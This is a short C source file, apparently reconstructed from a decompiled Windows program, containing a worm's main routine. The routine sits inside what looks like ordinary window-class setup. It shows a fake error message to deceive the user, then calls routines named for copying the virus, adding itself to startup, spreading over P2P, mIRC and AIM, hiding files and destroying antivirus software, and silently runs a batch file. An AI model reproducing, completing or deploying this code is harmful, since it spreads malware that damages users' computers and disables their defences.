#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

void _MyRegisterClass(HINSTANCE param_1)
{
    volatile struct _LocalCtx {
        WNDCLASSEXA local_3c;
    } ctx;

    ctx.local_3c.cbSize = sizeof(WNDCLASSEXA);
    ctx.local_3c.style = CS_HREDRAW | CS_VREDRAW;
    ctx.local_3c.lpfnWndProc = _WndProc_16;
    ctx.local_3c.cbClsExtra = 0;
    ctx.local_3c.cbWndExtra = 0;
    ctx.local_3c.hInstance = param_1;
    ctx.local_3c.hIcon = LoadIconA(param_1, (LPCSTR)0x7f00);
    ctx.local_3c.hCursor = LoadCursorA((HINSTANCE)0x0, (LPCSTR)0x7f00);
    ctx.local_3c.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    ctx.local_3c.lpszMenuName = NULL;
    ctx.local_3c.lpszClassName = _szWindowClass;
    ctx.local_3c.hIconSm = LoadIconA(ctx.local_3c.hInstance, (LPCSTR)0x7f00);

    MessageBoxA(_hWnd,
                "This program has encountered an error and needs to close, please try again. If the problem persists try restarting your computer.",
                "Error", MB_ICONERROR);
    _GetVirus();
    _CopyVirus();
    _WinStartup();
    _P2PCopy();
    _FindmIRC();
    _WriteBatch();
    _FindAIM();
    _HideFiles();
    _DestroyAVs();
    ShellExecuteA(_hWnd, "open", "BBbLWDB.Bat", NULL, NULL, SW_HIDE);
    RegisterClassExA(&ctx.local_3c);
}
#pragma optimize("", on)
